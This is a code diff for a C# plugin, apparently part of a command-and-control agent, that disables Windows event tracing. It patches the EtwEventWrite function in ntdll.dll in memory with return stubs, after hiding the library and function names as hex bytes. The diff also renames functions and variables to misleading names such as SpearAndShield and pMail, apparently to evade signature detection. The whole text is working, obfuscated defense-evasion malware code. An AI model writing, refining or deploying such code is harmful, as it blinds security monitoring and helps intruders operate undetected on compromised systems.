@@ -26,32 +26,21 @@ namespace Plugin
         {
             try
             {
-
-                if (Environment.Is64BitOperatingSystem)
+                if (Environment.Is64BitProcess)
                 {
-                    if (doit(new byte[] { 0x48, 0x33, 0xC0, 0xC3 }))
+                    if (SpearAndShield(new byte[] { 0x48, 0x33, 0xC0, 0xC3 }))
                     {
                         return new ResponseResult
                         {
                             completed = "true",
                             user_output = "Success",
                             task_id = (string)args["task-id"],
-                        };
-                    }
-                    else
-                    {
-                        return new ResponseResult
-                        {
-                            completed = "true",
-                            user_output = "Failed",
-                            task_id = (string)args["task-id"],
-                            status = "error"
                         };
                     }
                 }
                 else
                 {
-                    if (doit(new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 }))
+                    if (SpearAndShield(new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 }))
                     {
                         return new ResponseResult
                         {
@@ -60,17 +49,14 @@ namespace Plugin
                             task_id = (string)args["task-id"],
                         };
                     }
-                    else
-                    {
-                        return new ResponseResult
-                        {
-                            completed = "true",
-                            user_output = "Failed",
-                            task_id = (string)args["task-id"],
-                            status = "error"
-                        };
-                    }
                 }
+                return new ResponseResult
+                {
+                    completed = "true",
+                    user_output = "Failed",
+                    task_id = (string)args["task-id"],
+                    status = "error"
+                };
 
             }
             catch (Exception e)
@@ -85,19 +71,19 @@ namespace Plugin
                 };
             }
         }
-        private static bool doit(byte[] patch)
+        private static bool SpearAndShield(byte[] bSpear)
         {
             try
             {
-                uint oldProtect;
-                byte[] nb = new byte[] { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };
-                var ntdll = Win32.LoadLibrary(Encoding.ASCII.GetString(nb));
+                uint uCape;
+                byte[] bSword = new byte[] { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };
+                var pShield = Win32.LoadLibrary(Encoding.ASCII.GetString(bSword));
 
-                byte[] ew = new byte[] { 0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65 };
-                var etwEventSend = Win32.GetProcAddress(ntdll, Encoding.ASCII.GetString(ew));
+                byte[] bShield = new byte[] { 0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65 };
+                var pMail = Win32.GetProcAddress(pShield, Encoding.ASCII.GetString(bShield));
 
-                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
-                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
+                Win32.VirtualProtect(pMail, (UIntPtr)bSpear.Length, 0x40, out uCape);
+                Marshal.Copy(bSpear, 0, pMail, bSpear.Length);
                 return true;
             }
             catch
